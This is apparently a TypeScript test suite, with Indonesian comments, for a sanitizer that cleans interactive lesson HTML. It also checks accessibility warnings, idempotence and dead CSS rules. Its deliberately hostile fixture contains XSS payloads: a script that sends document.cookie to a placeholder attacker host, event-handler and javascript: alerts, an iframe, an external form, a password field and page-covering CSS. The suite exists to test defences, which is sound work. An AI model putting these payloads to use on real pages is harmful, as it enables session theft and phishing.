/**
 * Gerbang pembersih materi interaktif (docs/STANDAR-MATERI-INTERAKTIF.md §4).
 *
 *   npm run test:interaktif
 *
 * Satu berkas materi "nakal" -- skrip, penangan peristiwa, iframe, formulir,
 * input kata sandi, @import, @font-face, position: fixed, url() ke luar,
 * selector yang menunjuk :root dan body -- dilewatkan pembersih, lalu HASILNYA
 * yang diperiksa. Bukan daftar aturannya yang diuji, melainkan apa yang
 * benar-benar keluar.
 *
 * Separuh ujinya justru memastikan yang SAH tetap selamat: details, radio,
 * data-*, @media, @keyframes, dan selector ber-koma di dalam [attr]. Pembersih
 * yang membuang segalanya memang aman, tetapi membuat fiturnya tidak ada.
 */
import { CONTOH_MATERI_INTERAKTIF } from "@/lib/interactive-guide"
import { bersihkanMateriInteraktif } from "@/lib/sanitize-interactive"
import { KELAS_MATERI } from "@/lib/interactive-lesson"

let lulus = 0, gagal = 0
function cek(nama: string, benar: boolean, catatan = "") {
  if (benar) { lulus++; console.log("ok    " + nama) }
  else { gagal++; console.log("GAGAL " + nama + (catatan ? " -- " + catatan : "")) }
}

// === Materi NAKAL: semua serangan sekaligus ===
const nakal = `<!doctype html><html lang="id"><head>
<title>Judul</title><meta charset="utf-8">
<link rel="stylesheet" href="https://jahat.example/x.css">
<style>
  @import url("https://jahat.example/lagi.css");
  @font-face { font-family: X; src: url(https://jahat.example/f.woff2) }
  :root { --ring: red }
  body { background: #000 }
  .tutup { position: fixed; inset: 0; z-index: 99999; background: #fff }
  .lebar { width: 300vw }
  .bocor { background: url('https://pelacak.example/p.gif') }
  .aman { color: var(--ring); display: none }
  .hasil:has(#a:checked) ~ .x, .hasil[data-v="a,b"] { display: block }
  @media (max-width: 400px) { .aman { font-size: 12px } }
  @keyframes masuk { from { opacity: 0 } to { opacity: 1 } }
</style>
</head><body onload="alert(1)">
<script>fetch('https://jahat.example?c='+document.cookie)</script>
<h2 onclick="alert(2)">Judul materi</h2>
<a href="javascript:alert(3)">tautan jahat</a>
<a href="https://contoh.test">tautan sah</a>
<div class="tutup">menutupi semuanya</div>
<input type="password" name="sandi">
<input type="file">
<input type="radio" name="p" id="a" checked>
<label for="a">Pilihan A</label>
<details><summary>Buka</summary><p data-for="a">Isi.</p></details>
<img src="https://contoh.test/g.png" alt="gambar">
<iframe src="https://jahat.example"></iframe>
<form action="https://jahat.example"><button>kirim</button></form>
</body></html>`

const h = bersihkanMateriInteraktif(nakal)

console.log("--- KEAMANAN ---")
cek("tidak ada <script>", !/<script/i.test(h.html))
cek("tidak ada isi skrip", !/fetch\(|document\.cookie/i.test(h.html))
cek("tidak ada onload/onclick", !/on(load|click)=/i.test(h.html))
cek("tidak ada javascript:", !/javascript:/i.test(h.html))
cek("tidak ada <iframe>", !/<iframe/i.test(h.html))
cek("tidak ada <form>", !/<form/i.test(h.html))
cek("input password dibuang", !/type="password"/i.test(h.html))
cek("input file dibuang", !/type="file"/i.test(h.html))
cek("<link> luar dibuang", !/jahat\.example\/x\.css/i.test(h.html))

console.log("--- TATA LETAK ---")
cek("position: fixed dibuang", !/position:\s*fixed/i.test(h.html))
cek("@import dibuang", !/@import/i.test(h.html))
cek("@font-face dibuang", !/@font-face/i.test(h.html))
cek("url() ke luar dibuang", !/pelacak\.example/i.test(h.html))

console.log("--- LINGKUP CSS ---")
const css = /<style>([\s\S]*?)<\/style>/.exec(h.html)?.[1] ?? ""
const barisSelector = css.split("\n").filter((l) => l.includes("{") && !l.trim().startsWith("@"))
const takBerawalan = barisSelector.filter((l) => !l.includes("." + KELAS_MATERI) && !/^\s*(from|to|\d+%)/.test(l))
cek("setiap selector berawalan pembungkus", takBerawalan.length === 0, takBerawalan.join(" | ").slice(0, 90))
cek(":root diarahkan ke pembungkus", !/:root\s*\{/.test(css))
cek("body diarahkan ke pembungkus", !/(^|\})\s*body\s*\{/.test(css))
cek("@media dipertahankan", /@media/.test(css))
cek("@keyframes dipertahankan utuh", /@keyframes[\s\S]*?from\s*\{/.test(css))
cek("selector ber-koma dalam [attr] utuh", /data-v="a,b"/.test(css))

console.log("--- ISI SAH SELAMAT ---")
cek("judul selamat", /<h2>Judul materi<\/h2>/.test(h.html))
cek("tautan sah selamat", /contoh\.test/.test(h.html))
cek("radio selamat", /type="radio"/.test(h.html))
cek("details & summary selamat", /<details>[\s\S]*<summary>/.test(h.html))
cek("data-for selamat", /data-for="a"/.test(h.html))
cek("gambar selamat", /<img[^>]+alt="gambar"/.test(h.html))
cek("<head> tidak ikut", !/<title>|<meta/i.test(h.html))

console.log("--- LAPORAN KE PENYUSUN ---")
cek("dibuang dilaporkan", h.dibuang.length >= 5, h.dibuang.join(", ").slice(0, 70))
cek("peringatan skrip ada", h.peringatan.some((p) => /JavaScript/i.test(p)))
console.log("      dibuang:", h.dibuang.join(" · "))

/*
  Bagian kedua: pemeriksaan aksesibilitas. Berkas terpisah, karena berkas
  nakal di atas sengaja dibuat SAH secara aksesibilitas -- kalau keduanya
  dicampur, tidak jelas peringatan mana datang dari mana.
*/
console.log("\n--- AKSESIBILITAS ---")
const a = bersihkanMateriInteraktif(`
  <h1>Judul tandingan</h1>
  <h2>Bagian</h2>
  <h5>Lompat jauh</h5>
  <img src="https://contoh.test/a.png">
  <img src="https://contoh.test/b.png" alt="">
  <input type="checkbox" id="sah"><label for="sah">Berlabel</label>
  <input type="checkbox" id="yatim">
  <input type="checkbox" aria-label="Lewat aria">
  <table><tr><td>tanpa judul</td></tr></table>
`)
const punya = (pola: RegExp) => a.peringatan.some((p) => pola.test(p))
cek("h1 ditegur", punya(/<h1>/))
cek("lompatan judul ditegur", punya(/melompat/))
cek("gambar tanpa alt ditegur (1, bukan 2)", punya(/1 gambar tanpa atribut alt/), a.peringatan.join(" | ").slice(0, 80))
cek("kotak tanpa label ditegur (1, bukan 3)", punya(/1 kotak pilihan tanpa label/))
cek("tabel tanpa th ditegur", punya(/tanpa satu pun <th>/))
// Tiga cara melabeli yang SAH -- tidak satu pun boleh ditegur. Yang pertama
// dulu pernah ditegur, dan itu cara yang paling banyak dipakai orang.
const b = bersihkanMateriInteraktif(`
  <label><input type="checkbox"> Terbungkus label</label>
  <input type="checkbox" id="x"><label for="x">Lewat for</label>
  <input type="checkbox" aria-label="Lewat aria">
`)
cek("label pembungkus tidak ditegur", !b.peringatan.some((p) => /kotak pilihan/.test(p)), b.peringatan.join(" | "))
cek("komentar HTML tidak dikira skrip", !bersihkanMateriInteraktif("<!-- jangan pakai <script> --><p>a</p>").peringatan.some((p) => /JavaScript/.test(p)))
cek("materi rapi tidak ditegur", bersihkanMateriInteraktif("<h2>Oke</h2><p>Isi.</p>").peringatan.length === 0)

/*
  Bagian ketiga: contoh di dalam panduan tim.

  Panduan yang mengajarkan pola yang sudah tidak berlaku lebih buruk daripada
  tidak ada panduan -- penyusun mengikutinya, lalu materinya hilang sebagian
  dan mereka tidak tahu kenapa. Uji ini yang membuat itu tidak bisa terjadi
  diam-diam: contohnya harus lolos tanpa SATU pun bagian dibuang.
*/
/*
  Bagian: membersihkan dua kali harus menghasilkan yang sama.

  Isi yang sama melewati pembersih lebih dari sekali -- penyunting saat
  mengunggah, `saveCourseDraft` di pintu simpan, dan impor `.md` sekali lagi.
  Pembersih yang tidak idempoten merusak CSS penulis pada simpanan KEDUA,
  tanpa pesan apa pun: materinya cuma tampil polos.
*/
/*
  Bagian: tombol yang tidak mengubah apa pun.

  Kegagalan paling berbahaya bukan yang merusak halaman, melainkan yang diam.
  Diukur pada simulasi buatan AI: dua aturan varian menunjuk kelas yang tidak
  pernah ditulis di markahnya, dan ketiga tombolnya bisa ditekan tanpa
  mengubah layar sama sekali.
*/
console.log("\n--- ATURAN GAYA YANG MATI ---")
const mati = bersihkanMateriInteraktif(`
  <style>.sim:has(#a:checked) .ada{display:block}.sim:has(#b:checked) .tidak-ada{display:block}</style>
  <div class="sim"><input type="checkbox" id="a"><label for="a">A</label>
  <input type="checkbox" id="b"><label for="b">B</label><p class="ada">Isi</p></div>
`)
cek("kelas yatim ditegur", mati.peringatan.some((p) => /\.tidak-ada/.test(p)), mati.peringatan.join(" | ").slice(0, 90))
cek("kelas yang ada tidak ditegur", !mati.peringatan.some((p) => /\.ada\b/.test(p)))
cek("pembungkus sendiri tidak dituduh", !mati.peringatan.some((p) => /materi-interaktif/.test(p)))
const sehat = bersihkanMateriInteraktif(CONTOH_MATERI_INTERAKTIF)
cek("contoh panduan bebas kelas yatim", !sehat.peringatan.some((p) => /aturan gaya/.test(p)), sehat.peringatan.join(" | ").slice(0, 80))

console.log("\n--- DIBERSIHKAN DUA KALI ---")
const sekali = bersihkanMateriInteraktif(CONTOH_MATERI_INTERAKTIF).html
const dua = bersihkanMateriInteraktif(sekali).html
cek("hasilnya identik", sekali === dua, `${sekali.length} vs ${dua.length}`)
cek("tidak ada awalan ganda", !/\.materi-interaktif \.materi-interaktif/.test(dua))
cek("tiga kali pun tetap sama", bersihkanMateriInteraktif(dua).html === sekali)

console.log("\n--- CONTOH DI PANDUAN TIM ---")
const c = bersihkanMateriInteraktif(CONTOH_MATERI_INTERAKTIF)
cek("tidak ada bagian yang dibuang", c.dibuang.length === 0, c.dibuang.join(" · "))
cek("tidak ada peringatan aksesibilitas", !c.peringatan.some((p) => !/diarahkan ke kotak materi/.test(p)), c.peringatan.join(" | "))
cek("buka-tutup selamat", /<details>/.test(c.html))
cek("latihan pilih jawaban selamat", (c.html.match(/type="radio"/g) ?? []).length >= 3)
cek("daftar periksa selamat", (c.html.match(/type="checkbox"/g) ?? []).length >= 3)
cek("tanggapan latihan tersambung", /#j2:checked ~ \.benar/.test(c.html))
cek("wadah latihan selamat", /\.materi-interaktif \.latihan input/.test(c.html))
cek("hormat prefers-reduced-motion", /prefers-reduced-motion/.test(c.html))

console.log(`\n${lulus} lulus, ${gagal} gagal`)
process.exit(gagal > 0 ? 1 : 0)
